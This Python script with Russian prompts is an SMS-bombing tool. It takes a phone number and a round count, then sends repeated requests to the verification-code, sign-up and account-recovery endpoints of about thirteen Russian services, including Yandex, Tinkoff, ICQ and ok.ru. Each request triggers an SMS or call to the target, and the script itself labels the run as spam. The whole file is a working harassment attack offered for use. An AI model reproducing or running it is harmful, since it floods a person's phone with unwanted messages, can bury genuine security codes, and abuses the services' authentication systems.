import requests, time, os
from termcolor import colored
t=0
f=0
gg = 0
if t == 0:
    os.system("clear")
    phone = input(colored('Введите номер: (Без +) —>', 'magenta'))
    if len(phone) == 11:
        t = 1
    else:
        print(colored('Номер введён неверно !!!', 'red'))
        os.system("python3 dibom.py")
        exit()

if t == 1 or gg == 1:
    k = input(colored('Введите количество кругов —>', 'magenta'))
    t=2
else:
    input(colored('Неверно !!!', 'magenta'))
    gg = 1
if t == 2:
    f = 0
    os.system("clear")
    try:
        if int(k) >= 1:
            print(colored('Спам запущен!', 'green'))
            while int(k) > f:
                f += 1
                try:
                    a = requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/")
                    print(colored('citilink-[+]', 'green'))
                except:
                    print(colored('citilink-[-]', 'green'))
                try:
                    a = requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode",
                                  json={"reqId": "91101-1606335718",
                                        "params": {"phone": phone, "language": "ru-RU", "route": "sms",
                                                   "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}})
                    print(colored('icq-[+]', 'yellow'))
                except:
                    print(colored('icq-[-]', 'yellow'))
                try:
                    a = requests.post("https://taxi.yandex.ru/3.0/auth",
                                  json={"id": "fa137685fd594a9f86f529eec9543e96", "phone": phone})
                    print(colored('taxi.yandex-[+]', 'cyan'))
                except:
                    print(colored('taxi.yandex-[-]', 'cyan'))
                try:
                    a = requests.post("https://youla.ru/web-api/auth/request_code",
                                  json={"phone": phone})
                    print(colored('youla-[+]', 'magenta'))
                except:
                    print(colored('youla-[-]', 'magenta'))
                try:
                    a = requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
                                  json={"phone_number": phone})
                    print(colored('eda.yandex-[+]', 'yellow'))
                except:
                    print(colored('eda.yandex-[-]', 'yellow'))
                try:
                    a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/",
                                  data={"phone": phone})
                    print(colored('shop.vsk-[+]', 'green'))
                except:
                    print(colored('shop.vsk-[-]', 'green'))
                try:
                    a = requests.post("https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink",
                                  data={"st.r.phone": "+" + phone})
                    print(colored('ok.ru-[+]', 'blue'))
                except:
                    print(colored('ok.ru-[-]', 'blue'))
                try:
                    a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                                  json={"CellPhone": phone[1:]})
                    print(colored('my.modulbank-[+]', 'cyan'))
                except:
                    print(colored('my.modulbank-[-]', 'cyan'))
                try:
                    a = requests.post(
                    "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",

                    data={"phone": "+" + phone})
                    print(colored('tinkoff-[+]', 'yellow'))
                except:
                    print(colored('tinkoff-[-]', 'yellow'))
                try:
                    a = requests.post("https://sayan.rutaxi.ru/ajax_keycode.html?qip=962358614986707810&lang=ru&source=0",

                                  data={"l": phone[1:]})
                    print(colored('rutaxi-[+]', 'green'))
                except:
                    print(colored('rutaxi-[-]', 'green'))
                try:
                    a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                                  data={"CellPhone": phone[1:]})
                    print(colored('modulbank-[+]', 'magenta'))
                except:
                    print(colored('modulbank-[-]', 'magenta'))
                try:
                    a = requests.post("https://ng-api.webbankir.com/user/v2/create",
                                  json={"lastName": "уцвцу", "firstName": "цувцу", "middleName": "цуацуа",
                                        "mobilePhone": phone, "email": "asadsd@mail.ru", "smsCode": ""})
                    print(colored('webbankir-[+]', 'magenta'))
                except:
                    print(colored('webbankir-[-]', 'magenta'))
                try:
                   a = requests.post("https://stavropol.sushi-market.com/sendForm/callMeBack",
                                  json={"phone": phone[1:], "name": "Егор"})
                   print(colored('stavropol-[+]', 'yellow'))
                except:
                    print(colored('stavropol-[-]', 'yellow'))
                print(colored(f'{f}'+' - круг закончин!', 'green'))
            print(colored('Спам прекращён!', 'magenta'))
            time.sleep(3)
            os.system("python3 dibom.py")
            exit()
        else:
            os.system("python3 dibom.py")
            exit()
    except:
        os.system("python3 dibom.py")
        exit()
input()